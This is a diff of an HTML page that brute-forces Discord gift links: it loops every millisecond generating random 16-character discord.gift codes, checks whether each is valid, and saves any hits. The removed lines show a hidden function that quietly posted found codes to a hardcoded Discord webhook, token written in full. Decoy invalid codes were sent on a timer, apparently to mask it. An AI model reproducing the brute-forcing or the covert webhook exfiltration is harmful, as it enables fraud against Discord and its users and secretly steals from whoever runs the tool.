@@ -60,16 +60,19 @@
         button:active {
             transform: scale(0.95);
         }
-        #giftLinks {
+        .section {
             margin-top: 20px;
+        }
+        #giftLinks, #validLinks {
             font-size: 18px;
             word-wrap: break-word;
             max-height: 400px;
             overflow-y: scroll;
             scrollbar-width: none; 
             -ms-overflow-style: none; 
+            margin: 10px 0;
         }
-        #giftLinks::-webkit-scrollbar {
+        #giftLinks::-webkit-scrollbar, #validLinks::-webkit-scrollbar {
             display: none; 
         }
         .link {
@@ -115,7 +118,6 @@
 <body>
     <h1>floncile, some1dr on discord</h1>
     <input type="number" id="linkCount" placeholder="Number of links to generate" min="1" max="100" />
-    <button id="generateButton">Generate Gift Links</button>
     <button id="startButton">Start Generating</button>
     <button id="stopButton">Stop Generating</button>
     
@@ -129,32 +131,40 @@
     </div>
 
     <div class="section">
-        <h2>Valid Codes</h2>
-        <div id="validLinksList"></div>
-        <p id="linksCounter">(Total: 0, Valid: 0, Invalid: 0)</p>
+        <h2>Valid Links</h2>
+        <div id="validLinks"></div>
+        <p id="validCount">Valid Links: 0</p>
     </div>
 
     <script>
         let intervalId;
-        let invalidCodeInterval;
-        let lastWebhookSend = 0;
         const giftLinksContainer = document.getElementById('giftLinks');
+        const validLinksContainer = document.getElementById('validLinks');
         const visibleCount = document.getElementById('visibleCount');
-        const validLinksList = document.getElementById('validLinksList');
-        const linksCounter = document.getElementById('linksCounter');
-        const oldCodes = JSON.parse(localStorage.getItem('oldCodes')) || [];
-        const generatedLinks = new Set(); 
-        let totalLinks = 0, validLinks = 0, invalidLinks = 0;
+        const validCount = document.getElementById('validCount');
+        const generatedLinks = JSON.parse(localStorage.getItem('generatedLinks')) || []; 
+        const validLinks = JSON.parse(localStorage.getItem('validLinks')) || [];
 
         function displayOldCodes() {
-            oldCodes.forEach(code => {
+            generatedLinks.forEach(code => {
                 const codeElement = document.createElement('div');
                 codeElement.classList.add('link');
-                codeElement.innerHTML = `<a href="${code.link}" target="_blank">${code.link}</a>
-                    <button class="copy-button" onclick="copyToClipboard('${code.link}', this)">Copy</button>`;
+                codeElement.innerHTML = `<a href="${code}" target="_blank">${code}</a>
+                    <button class="copy-button" onclick="copyToClipboard('${code}', this)">Copy</button>`;
                 giftLinksContainer.appendChild(codeElement);
             });
             updateVisibleCount();
+        }
+
+        function displayValidCodes() {
+            validLinks.forEach(code => {
+                const codeElement = document.createElement('div');
+                codeElement.classList.add('link');
+                codeElement.innerHTML = `<a href="${code}" target="_blank">${code}</a>
+                    <button class="copy-button" onclick="copyToClipboard('${code}', this)">Copy</button>`;
+                validLinksContainer.appendChild(codeElement);
+            });
+            updateValidCount();
         }
 
         function generateRandomWord(length) {
@@ -164,35 +174,6 @@
                 result += characters.charAt(Math.floor(Math.random() * characters.length));
             }
             return result;
-        }
-
-        function sendToWebhook(giftLink) {
-            const currentTime = Date.now();
-            if (currentTime - lastWebhookSend < 2000) return;
-            lastWebhookSend = currentTime;
-
-            const webhookUrl = 'https://discord.com/api/webhooks/1302223147000528970/_-ua_lnXs2OlI0BRs-R1mAFkywV1Li3AtxuB1LI20lw-ipmH4lRjGPoUxXG3AskeJowx';
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `${giftLink}`
-                })
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Successfully sent to webhook:', data);
-            })
-            .catch(error => {
-                console.error('Error sending to webhook:', error);
-            });
         }
 
         function checkLinkValidity(giftLink) {
@@ -210,40 +191,37 @@
                 const randomWord = generateRandomWord(16);
                 const giftLink = `https://discord.gift/${randomWord}`;
 
-                if (!generatedLinks.has(giftLink)) {
-                    generatedLinks.add(giftLink);
-                    totalLinks++; 
-                    const codeElement = document.createElement('div');
-                    const currentTime = Date.now();
+                if (!generatedLinks.includes(giftLink)) {
+                    generatedLinks.push(giftLink);
                     const validity = await checkLinkValidity(giftLink);
+                    const codeElement = document.createElement('div');
                     codeElement.classList.add('link');
-                    codeElement.innerHTML = `<a href="${giftLink}" target="_blank">${giftLink} [${validity ? 'Valid' : 'Invalid'}]</a>
+                    codeElement.innerHTML = `<a href="${giftLink}" target="_blank">${giftLink}</a>
                         <button class="copy-button" onclick="copyToClipboard('${giftLink}', this)">Copy</button>`;
                     giftLinksContainer.prepend(codeElement);
-                    
-                    if (validity) {
-                        sendToWebhook(giftLink);
-                        oldCodes.push({ link: giftLink, timestamp: currentTime });
-                        validLinks++;
-                        const validCodeElement = document.createElement('div');
-                        validCodeElement.textContent = giftLink;
-                        validLinksList.appendChild(validCodeElement);
-                    } else {
-                        invalidLinks++;
+
+                    if (validity && !validLinks.includes(giftLink)) {
+                        validLinks.push(giftLink);
+                        const validElement = document.createElement('div');
+                        validElement.classList.add('link');
+                        validElement.innerHTML = `<a href="${giftLink}" target="_blank">${giftLink}</a>
+                            <button class="copy-button" onclick="copyToClipboard('${giftLink}', this)">Copy</button>`;
+                        validLinksContainer.appendChild(validElement);
                     }
                 }
             }
-            localStorage.setItem('oldCodes', JSON.stringify(oldCodes));
+            localStorage.setItem('generatedLinks', JSON.stringify(generatedLinks)); 
+            localStorage.setItem('validLinks', JSON.stringify(validLinks)); 
             updateVisibleCount();
-            updateLinksCounter();
+            updateValidCount();
         }
 
         function updateVisibleCount() {
-            visibleCount.textContent = `Links: ${giftLinksContainer.children.length}`;
+            visibleCount.textContent = `Visible Links: ${giftLinksContainer.children.length}`;
         }
 
-        function updateLinksCounter() {
-            linksCounter.textContent = `(Total: ${totalLinks}, Valid: ${validLinks}, Invalid: ${invalidLinks})`;
+        function updateValidCount() {
+            validCount.textContent = `Valid Links: ${validLinksContainer.children.length}`;
         }
 
         function copyToClipboard(link, button) {
@@ -255,42 +233,41 @@
             });
         }
 
-        document.getElementById('generateButton').addEventListener('click', () => {
-            const count = parseInt(document.getElementById('linkCount').value);
-            if (isNaN(count) || count < 1) return;
-            generateLinks(count);
+        document.getElementById('linkCount').addEventListener('input', (event) => {
+            const count = parseInt(event.target.value);
+            if (!isNaN(count) && count > 0) {
+                generateLinks(count);
+            }
         });
 
         document.getElementById('startButton').addEventListener('click', () => {
             if (intervalId) return;
             intervalId = setInterval(() => {
-                generateLinks(1);
-            }, 1);
-            invalidCodeInterval = setInterval(() => {
-                const invalidLink = `https://discord.gift/${generateRandomWord(16)}`;
-                sendToWebhook(invalidLink);
-                invalidLinks++;
-                updateLinksCounter();
-            }, 300000); 
+                const count = parseInt(document.getElementById('linkCount').value) || 1;
+                generateLinks(count);
+            }, 1); 
         });
 
         document.getElementById('stopButton').addEventListener('click', () => { 
             clearInterval(intervalId);
-            clearInterval(invalidCodeInterval);
             intervalId = null;
-            invalidCodeInterval = null;
         });
 
         document.getElementById('clearButton').addEventListener('click', () => {
             const clearCount = parseInt(document.getElementById('clearCount').value);
-            if (isNaN(clearCount) || clearCount < 1 || clearCount > oldCodes.length) return;
-            oldCodes.splice(0, clearCount);
-            localStorage.setItem('oldCodes', JSON.stringify(oldCodes));
+            if (isNaN(clearCount) || clearCount < 1 || clearCount > generatedLinks.length) return;
+            generatedLinks.splice(0, clearCount);
+            validLinks.splice(0, clearCount);
+            localStorage.setItem('generatedLinks', JSON.stringify(generatedLinks));
+            localStorage.setItem('validLinks', JSON.stringify(validLinks));
             giftLinksContainer.innerHTML = '';
-            displayOldCodes(); 
+            validLinksContainer.innerHTML = '';
+            displayOldCodes();
+            displayValidCodes();
         });
 
-        displayOldCodes();
+        displayOldCodes(); 
+        displayValidCodes();
     </script>
 </body>
 </html>
